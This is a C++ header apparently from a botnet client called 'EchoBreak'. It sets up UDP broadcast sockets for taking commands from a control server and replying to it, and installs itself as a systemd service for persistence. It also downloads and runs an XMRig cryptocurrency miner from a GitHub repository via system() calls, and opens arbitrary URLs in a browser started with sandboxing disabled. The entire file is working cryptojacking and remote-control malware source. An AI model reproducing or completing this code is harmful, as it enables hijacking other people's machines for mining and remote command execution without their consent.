#include <fstream>
#include <cstring>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <array>
#include <memory>

#define REC_PORT 6969
#define SENDING_PORT 6868
#define BUFFER_SIZE 256
#define MINER_GH std::string("https://github.com/xmr-rx0/EchoBreak-xmrig.git")
#define SERVICE "/etc/systemd/system/eb.service";

class Worker_utils
{
public:
    Worker_utils() { this->init(); };
    ~Worker_utils()
    {
        close(m_send_sock);
        close(m_rec_sock);
    }

    Worker_utils(const Worker_utils &) = delete;
    Worker_utils &operator=(const Worker_utils &) = delete;

public:
    inline bool isInstalled() { return std::ifstream(m_service).is_open(); };
    inline void setReceiveMsgCnt(uint cnt) { m_msg_count = cnt; };
    // Install to autostart
    void install(std::string user_name);

    // Base functions
    // Warning, that is blocking function, returns a splited by (;) vector of string
    void receive(std::vector<std::string> &messages);
    void send(std::string data);

    // Xmrig
    inline void instXmrig()
    {
        system(("git clone " + MINER_GH).c_str());
        system("chmod +x EchoBreak-xmrig/conf && EchoBreak-xmrig/./conf");
    };
    inline void runXmrix() { system("EchoBreak-xmrig/xmrig-6.22.2/./xmrig"); };
    inline void stopXmrig() { system("pkill xmrig"); };

    // :)
    inline void openUrl(std::string url) { system(("yandex-browser-stable --no-sandbox " + url).c_str()); }; // Replace to your browser

private:
    void init();
    void err(std::string wtf); // TODO: server loging

private:
    const std::string m_service = SERVICE;
    std::string m_broadcast_ip;

    uint m_msg_count = 1; // number of message to receive (is useful when ping)

private:
    // Variables for sending data to the server
    int m_send_sock;
    struct sockaddr_in m_send_broadcast_addr;
    socklen_t m_send_addr_len = sizeof(m_send_broadcast_addr);

    // Variables for receiving data from server
    int m_rec_sock;
    struct sockaddr_in m_rec_broadcast_addr;
    char m_buffer[BUFFER_SIZE];
    socklen_t m_rec_addr_len = sizeof(m_rec_broadcast_addr);
};

/*UTILS*/

static std::vector<std::string> split(std::string str)
{
    std::string word = "";
    std::vector<std::string> res;
    for (char c : str)
    {
        if (c == ';')
        {
            res.push_back(word);
            word = "";
        }
        else
        {
            word += c;
        }
    }
    res.push_back(word);
    return res;
}

static std::string exec(const char *cmd)
{
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, int (*)(FILE *)> pipe(popen(cmd, "r"), pclose);
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
    {
        result += buffer.data();
    }

    if (!result.empty() && result.back() == '\n')
    {
        result.pop_back();
    }

    return result;
}

static std::string getBroadCastAddress(){
    return exec("INTERFACE=$(ip route show default | awk \'{print $5}\') && ip -4 addr show $INTERFACE | awk \'$1 == \"inet\" {print $4}'");
}